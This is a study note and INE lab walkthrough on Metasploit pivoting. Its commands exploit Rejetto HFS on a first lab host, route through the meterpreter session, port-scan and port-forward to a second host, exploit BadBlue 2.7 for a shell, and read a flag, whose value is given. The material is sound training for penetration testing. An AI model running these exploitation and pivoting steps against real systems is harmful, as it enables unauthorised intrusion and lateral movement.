Lab link; https://my.ine.com/CyberSecurity/courses/06040120-3e1a-43cd-8ab3-d8d79df16b22/host-network-penetration-testing-the-metasploit-framework-msf/lab/6792b1f9-20f8-336c-a825-1dc9dc48b0ab

Another source for pivoting: [[Pivoting using Metasploit]] 
###### First check the interfaces of the device you compromise 
`ifconfig` or `ipconfig /all`

Then add the network route by typing the bellow command
```bash
run autoroute -s <pivot_ip/CIDR>
Ex: run autoroute -s 10.5.19.17/20
```

Rename the session
```bash
sessions -n victim-1 -i 1
```

Scan ports using MSFconsole
```bash
use auxiliary/scanner/portscan/tcp
set rhosts <victim-2_ip>
set ports 1-100
exploit
```

----------------

**Step 1:** Open the lab link to access the Kali machine.

![Content Image](https://assets.ine.com/lab/learningpath/e075ac48bf27dd7e183af464150ffa688746be0a9521e8bd01524f2535746a31.png)

**Step 2:** Check if the target machines are reachable:

**Command:**

```
ping -c 4 demo1.ine.local 10.0.19.197
ping -c 4 demo2.ine.local 10.0.18.172
```

![Content Image](https://assets.ine.com/lab/learningpath/f96a16f89adb163c06ef3dafd62144662564680b2b493327fe55210613131a71.jpg)

The target machine demo1.ine.local is reachable, and demo2.ine.local is not reachable.

**Step 3:** Port scanning with Nmap

To begin with, we will need to identify a vulnerable service running on the first target system, this can be done by performing a service version detection scan with Nmap.

**Command:**

```
nmap demo1.ine.local
```

![Content Image](https://assets.ine.com/lab/learningpath/778a49afcd23c8851a15c6469f9348d9649c6001d272cd308c50f32f63c55c11.jpg)

We have discovered that multiple ports are open. We will run nmap again to determine version information on port 80.

**Command:**

```sh
nmap -sV -p80 demo1.ine.local
```

![Content Image](https://assets.ine.com/lab/learningpath/7bfed3643ba8c45d291e93e8adf14c21d6adffed89815132d5e97022d2624f3f.jpg)

**Step 4:** Searching for exploits with Searchsploit

**Command:**

```sh
searchsploit hfs
```

As shown in the following screenshot, Searchsploit reveals that there is a Metasploit Framework exploit module that can be used to exploit this specific version of the **Rejetto HTTP File Server**.

![Content Image](https://assets.ine.com/lab/learningpath/edbf168df960e705d83f146502abe4790b9ba731b4238775f841a7f462403db6.jpg)

**Step 5:** Gaining access

To use this exploit module, we will need to start up the Metasploit Framework Console (msfconsole), this can be done by running the following command:

**Command:**

```
msfconsole -q
```

After starting **msfconsole**, we can load the module by running the following command:

**Command:**

```
use exploit/windows/http/rejetto_hfs_exec
```

We will now need to configure the module options, more specifically, we will need to set the target address. This can be done by running the following command:

**Command:**

```
set RHOSTS demo1.ine.local
```

After configuring the module options, we can execute the exploit module by running the following command:

**Command:**

```
exploit
```

As shown in the following screenshot, the exploit module runs successfully and provides us with a **meterpreter** session on the target system.

![Content Image](https://assets.ine.com/lab/learningpath/dc5ff75319112d9d7b99c8f4339117b9df93992b9003ecbe6fe39e8e87db3da9.jpg)

We have successfully exploited the target vulnerable application (hfs) and received a meterpreter shell. Check target machine IP Address.

**Command:**

```
ipconfig
```

![Content Image](https://assets.ine.com/lab/learningpath/c376d54153e49e64c3d148d443851c6f4a4b714608c52e249c32c985408a56d3.jpg)

We can observe, there is only one network adapter and we have two machine IP addresses.

But, we cannot access “demo2.ine.local” directly from the attacker’s machine.

We will add a route and then we will run an auxiliary port scanner module on the second victim machine to discover a host and open ports.

**Command:**
```
run autoroute -s <target1_ip>/20
```

```
run autoroute -s 10.0.19.0/20
```

![Content Image](https://assets.ine.com/lab/learningpath/00145f3ceb1c1cc5bd57652a83a196aed1d9c5c3e37da6dda43b7088a77f0c59.jpg)

Running the port scanner on the second machine.

**Command:**

```
background
use auxiliary/scanner/portscan/tcp
set RHOSTS demo2.ine.local
set PORTS 1-100
exploit
```

![Content Image](https://assets.ine.com/lab/learningpath/b7279b92812db9ed77784bd59c612538e3fb8154b8a535146c917eb15f343265.jpg)

We have discovered port 80 on the pivot machine. Now, we will forward the remote port 80 to local port 1234 and grab the banner using Nmap

**Command:**

```
sessions -i 1
portfwd add -l 1234 -p 80 -r <IP Address of demo2.ine.local>
portfwd list
```

**Note:** You can use the ping utility from Step 2 to find the IP address of the demo2.ine.local machine.

![Content Image](https://assets.ine.com/lab/learningpath/f446a41a09fcd0f1054031e6d217bb28e6c3503c984dfbca065dc1dbb2cdf22c.jpg)

We have forwarded the port, now use Nmap to find the running application name and version.

**Note:** Do not close msfconsole.

**Command:**

```
nmap -sV -sS -p 1234 localhost
```

![Content Image](https://assets.ine.com/lab/learningpath/08c207fc9d9620e100ccd07307416acc770cc2d1be397b8814d70d90d75ba346.jpg)

The machine is running BadBlue HTTPd 2.7, a Windows-based web server. We will search the exploit module for badblue 2.7 using searchsploit.

**Command:**

```
searchsploit badblue 2.7
```

![Content Image](https://assets.ine.com/lab/learningpath/48557f93bdfc62933f064077387f713b80fffdab30c956089067a827f5f8b068.jpg)

There is a Metasploit module for badblue server. We will use PassThu remote buffer overflow Metasploit module to exploit the target.

**Commands:**

```
background
use exploit/windows/http/badblue_passthru
set PAYLOAD windows/meterpreter/bind_tcp
set RHOSTS demo2.ine.local
exploit
```

![Content Image](https://assets.ine.com/lab/learningpath/88d1e5533fb31390817a9c070b47214fe49b08844577ec7b84633dc55b7fcaff.jpg)

We have successfully exploited the target vulnerable application (badblue) and received a meterpreter shell.

**Step 6:** Searching the flag.

**Command:**

```
shell
cd /
dir
type flag.txt
```

![Content Image](https://assets.ine.com/lab/learningpath/fe1a1d99dc388306c31a7e4503d3252b23f5b178d4c8f884eda33228472857e7.jpg)

This reveals the flag to us.

**Flag:** c46d12f28d87ae0b92b05ebd9fb8e817